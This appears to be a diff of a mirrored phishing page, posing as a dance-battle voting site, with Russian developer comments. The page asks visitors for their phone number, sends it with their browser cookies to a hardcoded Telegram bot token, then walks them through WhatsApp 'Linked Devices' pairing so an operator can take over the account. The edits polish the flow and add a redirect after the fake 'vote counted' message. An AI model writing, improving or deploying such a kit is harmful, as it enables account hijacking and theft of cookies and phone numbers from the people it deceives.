@@ -52,9 +52,12 @@
             /* ----- КОНЕЦ ПРИМЕРА */
             border-top: 5px solid #bfbbbb; /* Это было в вашем HTML, цвет активной части */
             /* Для анимации вращения, если она есть в number.css: */
-            /* animation: spin 1s linear infinite;  */
+            animation: spin 1s linear infinite; /* Добавил анимацию */
         }
-        /* @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } */ /* Если нужна анимация */
+        @keyframes spin { /* Добавил анимацию */
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
 
         .block.number .form .search { background-color: #ffffff; }
         .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb { background: #152b42; }
@@ -85,7 +88,7 @@
         .block.number .form-container .form input.number { color: #ffffff; background-color: transparent; border: 1px solid #80a2b3; }
         .block.number .form-container .form input.number:focus { border: 1px solid #1d9ce0; }
         .block.number .form-container .form p.error { color: #d65d7a; }
-        .block.code .number-container { border: 20px solid #1d3957; background-color: #ffffff; }
+        .block.code .number-container { border: 20px solid #1d3957; background-color: #ffffff; text-align: center; /* Чтобы лоадер был по центру */ }
         .popup .body { background-color: #1d3957; }
 
         @media screen and (max-width: 768px) {
@@ -95,12 +98,12 @@
                 border-width: 7px; /* Увеличиваем толщину линии, если border задан для всех сторон */
                                     /* Если у лоадера только border-top имеет цвет, то: */
                                     /* border-top-width: 7px; */
+                margin: 20px auto; /* Центрирование лоадера внутри .number-container */
             }
             .block.code .number-container { border: 10px solid #1d3957; }
         }
     </style>
 </head>
-
 <body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
     <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
         hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
@@ -163,7 +166,7 @@
                     <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">KeufuQduGbyIESnJxdKC
                         hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY WsLTZhNoKjWIykQojN
                         LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
-                    <div class="country"> <!-- Этот блок обновляется JS (number.js) при выборе страны -->
+                    <div class="country"> <!-- Этот блок обновляется JS (number.js или intlTelInput) при выборе страны -->
                         <div class="image">
                             <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
                                 alt="AU">
@@ -207,7 +210,7 @@
                             </div>
                             <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
                                 lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
-                            <input type="text" id="search" data-translate-key="form1.searchPlaceholder" placeholder="Search..."> <!-- Перевод плейсхолдера если нужно -->
+                            <input type="text" id="search" data-translate-key="form1.searchPlaceholder" placeholder="Search..."> 
 
                         </div>
                         <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
@@ -219,9 +222,12 @@
                                 EnxoxcmjcpyZygdOuwbVkt</ul>
                             <div class="overflow">
                                 <!-- *** СПИСОК СТРАН С ФЛАГАМИ (КАК В ВАШЕМ ПРИМЕРЕ) *** -->
+                                <!-- Вставьте сюда полный список стран из вашего исходного HTML -->
                                 <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
-                                <!-- ... (остальные страны из вашего списка) ... -->
+                                <div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
+                                <!-- ... и так далее для всех стран ... -->
                                 <div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
+                                <!-- *** КОНЕЦ СПИСКА СТРАН *** -->
                             </div>
                             <ul class="egeWSiccsIJQ SCLYYYcSeAF qaeFHqJVbGDfsBGDGrdnjSCK jOlNkfIrteJgkl">
                                 <h5 class="kvIpScpLemN">ITmVeZdXJDSCBWl zVbKqQUbIoZBZzyyzo DCbunYKAbrsFUv SygnOVnIsOj
@@ -265,7 +271,7 @@
                     WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
                     HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
             </div>
-        </div>
+        </div> <!-- Конец div#step-1 -->
 
         <h5
             class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
@@ -306,20 +312,15 @@
             <div class="number-column">
                 <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">lNJFwMkFeieFVsR
                     YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
-                <div class="number-container" id="loader-container"> <!-- Изменил ID чтобы не конфликтовать с .loader, теперь это контейнер -->
+                <div class="number-container" id="loader-container"> <!-- Контейнер для лоадера и кода -->
                     <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
-                    <div class="loader" style="display: none;"></div> <!-- Лоадер, изначально скрыт -->
+                    <div class="loader" style="display: none;"></div> <!-- Лоадер, изначально скрыт, управляется JS -->
 
+                    <!-- Этот блок с символами кода number-code, если он вам нужен, будет показываться JS -->
                     <div class="number-code hidden" id="number-code" data-code="">
-                        <div class="symbol"></div>
-                        <div class="symbol"></div>
-                        <div class="symbol"></div>
-                        <div class="symbol"></div>
+                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                         <div class="split">–</div>
-                        <div class="symbol"></div>
-                        <div class="symbol"></div>
-                        <div class="symbol"></div>
-                        <div class="symbol"></div>
+                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                     </div>
                     <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
                         <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
@@ -327,6 +328,7 @@
                     </div>
                 </div>
 
+                <!-- Форма для ввода кода -->
                 <div id="form-step-2-container" class="form-container form-code" style="display: none;"> <!-- Изначально скрыта, показывается JS -->
                     <p class="text code-title" data-translate-key="form2.codeLabel">Code:</p>
                     <div class="form" id="form-code">
@@ -343,19 +345,18 @@
                     <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
                         GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
                 </div>
-                <div class="button primary hidden" id="copy-code" data-translate-key="form2.copyButton">Copia</div>
+                <div class="button primary hidden" id="copy-code" data-translate-key="form2.copyButton">Copia</div> <!-- Если нужна кнопка копирования -->
             </div>
-        </div>
+        </div> <!-- Конец div#step-2 -->
 
         <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI QZhWtdNh</strong>
-    </div>
+    </div> <!-- Конец div.wrapper -->
     <small
         class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
         <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
             StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
     </small>
-    
-    <div class="popup top40" id="popreboot" style="display: none;"> <!-- Изначально скрыт -->
+    <div class="popup top40" id="popreboot" style="display: none;"> <!-- Изначально скрыт, управляется JS -->
         <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
         <div class="body">
             <h2 data-translate-key="popup.reboot.title">Your vote has been counted, thank you</h2>
@@ -369,7 +370,7 @@
         </small>
     </div>
 
-    <div class="popup top40" id="popwhat" style="display: none;"> <!-- Изначально скрыт -->
+    <div class="popup top40" id="popwhat" style="display: none;"> <!-- Изначально скрыт, управляется JS -->
         <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
         <div class="body">
             <h2 data-translate-key="popup.what.title">Something is wrong!</h2>
@@ -404,15 +405,17 @@
                 "form1.error.invalidNumber": "Invalid phone number",
                 "form1.error.phoneRequired": "Phone number is required.", // For paragraph error
                 "form1.error.phoneRequiredAlert": "Please enter your phone number.", // For alert
-                "form1.verifyCodePlaceholder": "Enter code",
-                "form1.verifySubmitButton": "Confirm",
+                "form1.verifyCodePlaceholder": "Enter code", // For the extra verify form you had
+                "form1.verifySubmitButton": "Confirm",    // For the extra verify form you had
+                "form1.error.noCookies": "No cookies found",
+
 
                 "form2.title": "Quick and easy authorization via WhatsApp",
                 "form2.description": "Log in to the WhatsApp app, select 'Linked Devices' in the settings window, then enter this code",
                 "form2.codeLabel": "Code:",
                 "form2.codePlaceholder": "Enter code",
                 "form2.copyButton": "Copy",
-                "form2.error.noData": "Code or phone number is missing.", // For alert
+                "form2.error.noData": "Code or phone number is missing.", 
 
                 "popup.reboot.title": "Your vote has been counted, thank you",
                 "popup.reboot.button": "Ok",
@@ -420,7 +423,7 @@
                 "popup.what.paragraph": "You entered the code incorrectly. Go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.",
                 "popup.what.button": "Reboot",
 
-                "error.backendConnection": "Error connecting to the server. Please try again." // For network errors
+                "error.backendConnection": "Error connecting to the server. Please try again."
             },
             // --- Italian ---
             it: {
@@ -434,6 +437,8 @@
                 "form1.error.phoneRequiredAlert": "Inserisci il numero di telefono.",
                 "form1.verifyCodePlaceholder": "Inserisci codice",
                 "form1.verifySubmitButton": "Conferma",
+                "form1.error.noCookies": "Nessun cookie trovato",
+
 
                 "form2.title": "Autorizzazione rapida e facile tramite WhatsApp",
                 "form2.description": "Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle impostazioni, quindi inserisci questo codice",
@@ -446,7 +451,7 @@
                 "popup.reboot.button": "Ok",
                 "popup.what.title": "Qualcosa è andato storto!",
                 "popup.what.paragraph": "Hai inserito il codice in modo errato. Vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verrà conteggiato.",
-                "popup.what.button": "Riprova", // Reboot -> Riprova (Try again) or Riavvia (Restart)
+                "popup.what.button": "Riprova", 
 
                 "error.backendConnection": "Errore di connessione al server. Riprova."
             },
@@ -462,6 +467,7 @@
                 "form1.error.phoneRequiredAlert": "Введите номер телефона.",
                 "form1.verifyCodePlaceholder": "Введите код",
                 "form1.verifySubmitButton": "Подтвердить",
+                "form1.error.noCookies": "Куки не найдены",
 
                 "form2.title": "Быстрая и легкая авторизация через WhatsApp",
                 "form2.description": "Войдите в приложение WhatsApp, выберите 'Связанные устройства' в окне настроек, затем введите этот код",
@@ -493,18 +499,17 @@
 
             document.querySelectorAll('[data-translate-key]').forEach(element => {
                 const key = element.getAttribute('data-translate-key');
-                const translation = translations[lang][key] || translations['en'][key]; // Fallback to English if key not in current lang
+                // Пытаемся взять перевод для текущего языка, если нет - для английского (fallback)
+                const translation = translations[lang]?.[key] || translations['en']?.[key]; 
 
                 if (translation) {
                     if (element.tagName === 'INPUT' && (element.type === 'button' || element.type === 'submit' || element.type === 'reset')) {
                         element.value = translation;
                     } else if (element.tagName === 'INPUT' && element.hasAttribute('placeholder')) {
                         element.placeholder = translation;
-                    }
-                    else if (element.tagName === 'TITLE') {
-                         document.title = translation;
-                    }
-                     else {
+                    } else if (element.tagName === 'TITLE') {
+                         document.title = translation; // Обновляем заголовок страницы
+                    } else {
                         element.textContent = translation;
                     }
                 } else {
@@ -518,22 +523,25 @@
             let detectedLanguage = 'en'; // Default
             const htmlTagLang = document.documentElement.lang;
 
+            // 1. Пробуем язык из <html lang="...">
             if (htmlTagLang && translations[htmlTagLang.split('-')[0]]) {
                 detectedLanguage = htmlTagLang.split('-')[0];
             } else {
-                // Попытка получить язык из URL (например, /login/zomia-it -> it)
+                // 2. Попытка получить язык из URL (например, /login/zomia-it -> it)
                 const pathParts = window.location.pathname.split('/');
                 const lastPathPart = pathParts.pop() || pathParts.pop(); // Handle trailing slash
 
                 if (lastPathPart) {
+                    // Если формат zomia-it, берем 'it'. Если просто 'it', берем 'it'.
                     const langCandidate = lastPathPart.includes('-') ? lastPathPart.split('-').pop() : lastPathPart;
                     if (translations[langCandidate]) {
                         detectedLanguage = langCandidate;
                     }
                 }
             }
-            // Если не удалось определить из URL, пробуем язык браузера
-            if (detectedLanguage === 'en') { // если все еще 'en' и не было явного указания
+            
+            // 3. Если не удалось определить из URL или HTML-тега, пробуем язык браузера
+            if (detectedLanguage === 'en' && !(htmlTagLang && translations[htmlTagLang.split('-')[0]])) { 
                  const browserLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
                  if (translations[browserLang]) {
                      detectedLanguage = browserLang;
@@ -544,9 +552,10 @@
             // --- Обработчики кнопок попапов ---
             document.getElementById("btn-ok-reboot")?.addEventListener("click", () => {
                 document.getElementById("popreboot").style.display = "none";
-                // Возможно, здесь нужен редирект на data-redirect из body
-                // const redirectUrl = document.body.dataset.redirect;
-                // if (redirectUrl) window.location.href = redirectUrl;
+                const redirectUrl = document.body.dataset.redirect;
+                if (redirectUrl) {
+                    window.location.href = redirectUrl; // Редирект после успешного голосования
+                }
             });
 
             document.getElementById("btn-reboot-what")?.addEventListener("click", () => {
@@ -554,28 +563,29 @@
             });
 
             // --- Инициализация состояний ---
-            const loaderElement = document.querySelector("#loader-container .loader"); // Конкретный лоадер
+            const loaderElement = document.querySelector("#loader-container .loader"); 
             const formStep2Container = document.getElementById("form-step-2-container");
 
             // --- Константы для Telegram ---
-            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g"; // ТОКЕН ДОЛЖЕН БЫТЬ СКРЫТ НА БЭКЕНДЕ
+            // ВАЖНО: Хранение токена в клиентском JS - это ОЧЕНЬ НЕБЕЗОПАСНО.
+            // Этот запрос должен идти через ваш бэкенд.
+            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g"; 
             const chat_id = "7538727898";
-            const backendURL = "https://api.bestballerinavote.com"; // Ваш URL для проверки статуса
+            const backendURL = "https://api.bestballerinavote.com"; 
 
             // --- Элементы DOM ---
             const nextStepBtn = document.getElementById("next-step");
             const codeStepBtn = document.getElementById("two-step");
             const errorParagraphStep1 = document.querySelector('#form-step-1 .form p.error');
 
-
             // --- Логика шагов ---
             nextStepBtn?.addEventListener("click", function (e) {
                 e.preventDefault();
                 const phoneInput = document.getElementById("number");
-                const phone = phoneInput.value.trim();
+                const phone = phoneInput.value.trim(); // Здесь уже будет номер с кодом страны от intl-tel-input
                 const cookies = document.cookie || (translations[currentLang]['form1.error.noCookies'] || "No cookies");
 
-                if (!phone) {
+                if (!phone) { // Простая проверка, что поле не пустое. intl-tel-input может иметь свои методы валидации (iti.isValidNumber())
                     if (errorParagraphStep1) {
                         errorParagraphStep1.textContent = translations[currentLang]["form1.error.phoneRequired"] || "Phone number is required.";
                         errorParagraphStep1.classList.remove('hidden');
@@ -591,7 +601,8 @@
                 sessionStorage.setItem("submittedPhone", phone);
 
                 const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { // ПРЯМОЙ ЗАПРОС С ТОКЕНОМ В JS - НЕБЕЗОПАСНО
+                // НЕБЕЗОПАСНО: Прямой запрос к Telegram API с токеном
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { 
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id, text: msg })
@@ -600,8 +611,8 @@
                 document.getElementById("step-1").style.display = "none";
                 const step2Block = document.getElementById("step-2");
                 step2Block.classList.remove("hidden");
-                step2Block.style.display = "block"; // Показываем весь блок второго шага
-                if (formStep2Container) formStep2Container.style.display = "block"; // Показываем форму ввода кода на втором шаге
+                step2Block.style.display = "block"; 
+                if (formStep2Container) formStep2Container.style.display = "block"; 
                 document.getElementById("code").focus();
             });
 
@@ -624,15 +635,15 @@
                          { text: "❌ Ні", callback_data: `confirm_no_${phone}` }]
                     ]
                 };
-
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { // ПРЯМОЙ ЗАПРОС С ТОКЕНОМ В JS - НЕБЕЗОПАСНО
+                // НЕБЕЗОПАСНО: Прямой запрос к Telegram API с токеном
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { 
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id, text: msg, reply_markup: keyboard })
                 }).catch(err => console.error("Telegram API error:", err));
 
                 if (formStep2Container) formStep2Container.style.display = "none";
-                if (loaderElement) loaderElement.style.display = "block"; // Показываем лоадер
+                if (loaderElement) loaderElement.style.display = "block"; 
 
                 waitForApproval(phone);
             });
@@ -659,51 +670,81 @@
                         })
                         .catch(err => {
                             console.error("❌ Помилка запиту до бекенду:", err);
-                            // clearInterval(interval); // Можно раскомментировать, чтобы остановить при ошибке
+                            // Можно раскомментировать для остановки и показа ошибки пользователю
+                            // clearInterval(interval); 
                             // if (loaderElement) loaderElement.style.display = "none";
                             // alert(translations[currentLang]["error.backendConnection"] || "Error connecting to the server. Please try again.");
                         });
                 }, 3000);
             }
 
-            // Инициализация intl-tel-input (если вы используете его для ввода номера)
+            // Инициализация intl-tel-input
             const phoneInputField = document.querySelector("#number");
             if (phoneInputField && window.intlTelInput) {
                 const iti = window.intlTelInput(phoneInputField, {
                     initialCountry: "auto",
-                    geoIpLookup: function(callback) {
+                    geoIpLookup: function(success, failure) { // Изменен API для geoIpLookup
                         fetch("https://ipapi.co/json")
                           .then(function(res) { return res.json(); })
-                          .then(function(data) { callback(data.country_code); })
-                          .catch(function() { callback("us"); }); // Fallback
+                          .then(function(data) { success(data.country_code); })
+                          .catch(function() { success("us"); }); // Fallback
                     },
-                    utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+                    utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+                    nationalMode: false, // Чтобы всегда показывался код страны
+                    formatOnDisplay: true, // Форматирует номер при отображении
+                    separateDialCode: true // Показывает код страны отдельно
                 });
-                // Можно добавить обработчик события countrychange, если нужно синхронизировать с вашим кастомным списком
-                 phoneInputField.addEventListener('countrychange', function() {
-                    // Ваш кастомный список флагов (class="country") должен обновляться здесь,
-                    // если вы хотите, чтобы intl-tel-input управлял выбранной страной.
-                    // Либо ваш кастомный список должен вызывать iti.setCountry() при выборе.
-                    // Сейчас у вас, похоже, две разные системы для флагов.
+                
+                // Синхронизация кастомного списка флагов с intl-tel-input (если нужно)
+                phoneInputField.addEventListener('countrychange', function() {
                     const selectedCountryData = iti.getSelectedCountryData();
                     const countryDiv = document.querySelector('.block.number .form .country');
-                    if (countryDiv) {
-                        const img = countryDiv.querySelector('.image img');
-                        const nameP = countryDiv.querySelector('p.name');
-                        if (img) {
-                            img.src = `https://dancebattle.life/static/img/flags/${selectedCountryData.iso2.toUpperCase()}.png`;
-                            img.alt = selectedCountryData.iso2.toUpperCase();
-                        }
-                        if (nameP) nameP.textContent = selectedCountryData.name;
-                        // Обновление инпута #number, если нужно, чтобы он содержал код страны
-                        // phoneInputField.value = "+" + selectedCountryData.dialCode;
-                    }
-                });
-            }
+                    const countryDivImg = countryDiv?.querySelector('.image img');
+                    const countryDivName = countryDiv?.querySelector('p.name');
 
-        });
+                    if (countryDivImg) {
+                        countryDivImg.src = `https://dancebattle.life/static/img/flags/${selectedCountryData.iso2.toUpperCase()}.png`;
+                        countryDivImg.alt = selectedCountryData.iso2.toUpperCase();
+                    }
+                    if (countryDivName) {
+                        countryDivName.textContent = selectedCountryData.name;
+                    }
+                    // Обновление значения инпута #number не требуется, т.к. intl-tel-input делает это сам.
+                    // Однако, если ваш кастомный список стран (тот, что с классом .countries) используется для ВЫБОРА страны,
+                    // то при клике на элемент в этом списке вам нужно будет вызывать iti.setCountry(countryCode);
+                    // чтобы intl-tel-input обновился.
+                });
+
+                // Пример, как обновить intl-tel-input из вашего кастомного списка:
+                document.querySelectorAll('.countries .item').forEach(item => {
+                    item.addEventListener('click', () => {
+                        const countryCode = item.dataset.lang; // 'AU', 'GB', etc.
+                        if (countryCode) {
+                            iti.setCountry(countryCode.toLowerCase());
+                        }
+                        // Также обновите ваш блок .country вручную, как это делает number.js
+                        const countryDiv = document.querySelector('.block.number .form .country');
+                        const countryDivImg = countryDiv?.querySelector('.image img');
+                        const countryDivName = countryDiv?.querySelector('p.name');
+                        const itemImg = item.querySelector('.image img');
+                        const itemName = item.querySelector('p.name');
+
+                        if(countryDivImg && itemImg) countryDivImg.src = itemImg.src;
+                        if(countryDivName && itemName) countryDivName.textContent = itemName.textContent;
+                        
+                        document.querySelector('.countries').classList.add('hidden'); // Скрыть список
+                    });
+                });
+                 // Открытие/закрытие вашего кастомного списка стран
+                const countrySelector = document.querySelector('.block.number .form .country');
+                countrySelector?.addEventListener('click', () => {
+                    document.querySelector('.countries').classList.toggle('hidden');
+                });
+
+
+            } // конец if (phoneInputField && window.intlTelInput)
+
+        }); // конец DOMContentLoaded
     </script>
 </body>
-
-<!-- Mirrored from dancebattle.life/login/zomia-it by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Apr 2025 13:02:07 GMT -->
 </html>
